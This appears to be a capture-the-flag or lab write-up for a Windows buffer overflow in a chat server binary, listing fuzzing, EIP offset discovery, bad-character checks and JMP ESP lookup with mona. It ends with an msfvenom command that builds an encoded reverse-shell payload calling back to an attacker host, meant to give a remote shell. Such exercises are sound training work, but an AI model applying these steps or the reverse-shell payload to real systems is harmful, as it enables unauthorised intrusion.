# Brainstorm

Nmap scan reveals ftp service with anonymous access enabled. The ftp directory contains the 
chatserver PE and essfunc.dll.

Running the chatserver with Immunity Debugger and connecting shows 2 potential inputs to 
overflow, name and message.

Name is cut off at 20 characters but message is vulnerable and will crash at 2100 bytes

Using the Metasploit tool pattern_create.rb, create cyclic values 400 bytes longer than 
the crash value and set the payload variable with the output in exploit.py. Execute the 
exploit and use mona to find the EIP offset.

Set the offset value in exploit.py and set the retn variable to "BBBB" (42424242) to check 
if the EIP is overwritten correctly.

Next step is to check for badchars by generating a bytearray with mona, excluding the 
nullbyte:

`!mona bytearray -cpb "\x00"`

And sending a payload of badchars excluding the nullbyte:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Verify remaining badchars with mona:

`!mona compare -f c:\mona\bytearray.bin -a esp`

Find a jump point excluding the bad chars and set retn with the address:

`!mona jmp -r esp -cpb "\x00"`

Generate the payload with msfvenom and set the payload variable with the returned code

`msfvenom -p windows/reverse_tcp LHOST=10.10.1.11 LPORT=4444 EXITFUNC=thread -b "\x00" -f python -e x86/shikata_ga_nai`

Fuzzing crashes at: 2100 bytes

EIP offset: 2012

Bad chars: \x00

[exploit.py](./exploit.py)

Run exploit.py to gain a remote shell on the target
